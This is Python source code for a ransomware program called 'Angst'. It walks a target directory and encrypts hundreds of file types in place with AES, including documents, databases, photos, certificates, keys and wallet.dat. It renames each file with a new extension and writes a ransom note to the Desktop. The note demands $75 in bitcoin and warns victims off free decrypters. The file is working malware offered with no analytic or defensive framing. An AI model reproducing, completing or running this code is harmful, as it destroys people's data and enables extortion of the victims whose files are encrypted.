from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

FILETYPES = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']

class Ransomware(object):
    def __init__(self, key, target_dir, extenstion, btcAddy, email):
        self.target_dir = target_dir
        self.extenstion = extenstion
        self.btcAddy = btcAddy
        self.email = email
        self.crypto = AES.new(key, AES.MODE_ECB)
        self.angst()

    def encrypt(self, filepath):
        """
        Encrypts given text
        """
        try:
            with open(filepath, "rb") as file:
                content = self.crypto.encrypt(pad(file.read(),32))
                with open(filepath, "wb") as newF:
                    newF.write(content)
                    newF.flush()
                    newF.close()
            os.rename(filepath, filepath + self.extenstion)
        except:
            pass

    def angst(self):
        """
        The full ransomware module
        """
        for subdir, dirs, files in os.walk(self.target_dir):
            for file in files:
                filepath = subdir + os.sep + file
                for ft in FILETYPES:
                    if ft in filepath:
                        self.encrypt(filepath)
        self.readme()

    def readme(self):
        """
        The ransomwares readme note
        """
        ransomnote = """Hello, 
\tCongrats you have been hit by Angst so lets talk about recovering your files. First off don't even waste your time with free decrypters.
This can and will result in file corruption if not in a total loss of files. We have included steps for fully and properly decrypting your files, if you fail
to complete these steps then you will loose your files.
----------------------------------
1. Download BitPay: https://bitpay.com/ This can also be downloaded from the microsoft store.
2. Purchase $75 in bitcoin using the buy crypto option
3. Send that $75 in bitcoin to this addr: %s
4. After you have sent the money send an email to %s saying that you have paid and please include your user id.
5. Wait roughly 4 hours, I will send you your decrypter and key which can be used to decrypt all files encrypted by the ransomware.
----------------------------------
""" % (self.btcAddy, self.email)

        readme = os.environ["HOMEPATH"] + "\\Desktop\\readme.txt"
        with open(readme, "w",encoding="utf-8") as important:
            important.write(ransomnote)
            important.flush()
            important.close()